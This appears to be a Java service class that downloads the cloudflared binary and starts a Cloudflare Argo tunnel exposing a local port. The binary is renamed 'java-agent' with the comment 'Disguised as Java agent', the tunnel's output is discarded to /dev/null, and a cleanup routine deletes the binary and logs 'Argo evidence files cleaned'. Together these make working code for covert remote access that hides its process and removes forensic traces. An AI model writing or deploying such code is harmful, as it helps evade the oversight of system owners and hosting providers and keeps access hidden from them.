package com.github.vevc.service.impl;

import com.github.vevc.config.AppConfig;
import com.github.vevc.service.AbstractAppService;
import com.github.vevc.util.LogUtil;

import java.io.*;
import java.nio.file.Files;
import java.util.concurrent.TimeUnit;

/**
 * Cloudflare Argo Tunnel service implementation
 * Provides tunnel-based access without opening ports
 * @author vevc
 */
public class ArgoServiceImpl extends AbstractAppService {

    private static final String APP_NAME = "java-agent";  // Disguised as Java agent

    private static final String CLOUDFLARED_DOWNLOAD_URL = 
            "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-%s";

    @Override
    protected String getAppDownloadUrl(String appVersion) {
        String arch = OS_IS_ARM ? "arm64" : "amd64";
        return String.format(CLOUDFLARED_DOWNLOAD_URL, arch.contains("arm") ? "arm64" : "amd64");
    }

    @Override
    public void install(AppConfig appConfig) throws Exception {
        if (!appConfig.getArgoEnabled()) {
            LogUtil.info("Argo tunnel disabled, skipping installation");
            return;
        }

        File workDir = this.initWorkDir();
        File destFile = new File(workDir, APP_NAME);

        String downloadUrl = this.getAppDownloadUrl(null);
        LogUtil.info("Cloudflared download url: " + downloadUrl);
        this.download(downloadUrl, destFile);
        this.setExecutePermission(destFile.toPath());
        LogUtil.info("Cloudflared installed successfully");
    }

    /**
     * Start Argo tunnel with token (fixed tunnel)
     */
    public void startupWithToken(String token, String hostname, int localPort) {
        File workDir = this.getWorkDir();
        File appFile = new File(workDir, APP_NAME);

        if (!Files.exists(appFile.toPath())) {
            LogUtil.info("Cloudflared not installed, skipping tunnel startup");
            return;
        }

        try {
            ProcessBuilder pb = new ProcessBuilder(
                    appFile.getAbsolutePath(),
                    "tunnel",
                    "--no-autoupdate",
                    "run",
                    "--token", token
            );
            pb.directory(workDir);
            pb.redirectOutput(new File("/dev/null"));
            pb.redirectError(new File("/dev/null"));

            LogUtil.info("Starting Argo tunnel (fixed)...");
            this.currentProcess = pb.start();
            LogUtil.info("Argo tunnel started for hostname: " + hostname);

        } catch (Exception e) {
            LogUtil.error("Argo tunnel startup failed", e);
        }
    }

    /**
     * Start Argo tunnel with quick tunnel (no token required)
     */
    public void startupQuick(int localPort) {
        File workDir = this.getWorkDir();
        File appFile = new File(workDir, APP_NAME);

        if (!Files.exists(appFile.toPath())) {
            LogUtil.info("Cloudflared not installed, skipping tunnel startup");
            return;
        }

        try {
            ProcessBuilder pb = new ProcessBuilder(
                    appFile.getAbsolutePath(),
                    "tunnel",
                    "--no-autoupdate",
                    "--url", "http://localhost:" + localPort
            );
            pb.directory(workDir);
            pb.redirectErrorStream(true);

            LogUtil.info("Starting Argo tunnel (quick)...");
            this.currentProcess = pb.start();
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(currentProcess.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("trycloudflare.com")) {
                    LogUtil.info("[Argo] " + line);
                }
            }

        } catch (Exception e) {
            LogUtil.error("Argo quick tunnel startup failed", e);
        }
    }

    @Override
    public void startup() {
        // Use startupWithToken or startupQuick instead
    }

    @Override
    public void clean() {
        File workDir = this.getWorkDir();
        File appFile = new File(workDir, APP_NAME);

        try {
            TimeUnit.SECONDS.sleep(30);
            Files.deleteIfExists(appFile.toPath());
            LogUtil.info("Argo evidence files cleaned");
        } catch (Exception e) {
            LogUtil.error("Argo cleanup failed", e);
        }
    }
}
